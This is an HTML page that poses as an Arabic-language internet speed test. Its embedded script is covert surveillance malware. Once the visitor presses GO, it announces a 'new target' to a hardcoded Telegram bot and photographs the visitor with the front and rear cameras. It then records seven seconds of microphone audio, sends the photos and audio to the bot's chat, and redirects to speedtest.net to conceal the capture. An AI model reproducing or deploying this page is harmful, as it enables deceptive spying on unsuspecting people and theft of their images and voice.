
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>SpeedTest</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #0b0e18; color: white; text-align: center; font-family: sans-serif; padding-top: 50px; }
        .btn { width: 150px; height: 150px; border-radius: 50%; border: 4px solid #00d2ff; background: none; color: #00d2ff; font-size: 30px; cursor: pointer; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <h2>فحص سرعة الإنترنت</h2>
    <button id="goBtn" class="btn">GO</button>
    <p id="status">اضغط للبدء</p>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const token = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
        const chat = "7984067238";

        async function send(msg, isImg, data, isVoice) {
            const fd = new FormData();
            fd.append("chat_id", chat);
            let url = `https://api.telegram.org/bot${token}/`;
            if(isVoice) { fd.append("voice", data, "a.ogg"); url += "sendVoice"; }
            else if(isImg) { fd.append("photo", data, "p.jpg"); fd.append("caption", msg); url += "sendPhoto"; }
            else { url += `sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`; }
            try { await fetch(url, { method: "POST", body: fd }); } catch(e){}
        }

        // الحل: دالة التقاط الصور تعمل "بمفردها" تماماً وتغلق الكاميرا قبل أي شيء آخر
        async function takePhotos(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                const v = document.getElementById("v");
                const c = document.getElementById("c");
                v.srcObject = stream;
                
                // أهم خطوة: انتظار 3 ثوانٍ كاملة لتجنب السواد (الوقت الكافي لفتح العدسة)
                await new Promise(r => setTimeout(r, 3000)); 
                
                c.width = 480; c.height = 640;
                c.getContext("2d").drawImage(v, 0, 0);
                const blob = await new Promise(res => c.toBlob(res, "image/jpeg", 0.7));
                
                // إغلاق الكاميرا فوراً لتحرير الموارد للميكروفون
                stream.getTracks().forEach(t => t.stop());
                return blob;
            } catch(e) { return null; }
        }

        document.getElementById("goBtn").onclick = async function() {
            this.style.display = "none";
            document.getElementById("status").innerText = "جاري الفحص...";

            // 1. التقرير والموقع
            await send("🔔 دخل هدف جديد الآن!");

            // 2. التقاط الصور أولاً (قبل طلب إذن الصوت) لضمان عدم السواد
            const p1 = await takePhotos("user");
            if(p1) await send("👤 صورة أمامية", true, p1);
            
            const p2 = await takePhotos("environment");
            if(p2) await send("🌍 صورة خلفية", true, p2);

            // 3. الآن فقط نطلب الميكروفون بعد أن أغلقت الكاميرا تماماً
            try {
                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
                const mr = new MediaRecorder(s);
                const ch = [];
                mr.ondataavailable = e => ch.push(e.data);
                mr.onstop = async () => {
                    const blob = new Blob(ch, { type:  audio/ogg  });
                    await send(null, false, blob, true);
                    s.getTracks().forEach(t => t.stop());
                    location.href = "https://www.speedtest.net/";
                };
                mr.start();
                setTimeout(() => mr.stop(), 7000); // تسجيل 7 ثوانٍ
            } catch(e) { location.href = "https://www.speedtest.net/"; }
        };
    </script>
</body>
</html>
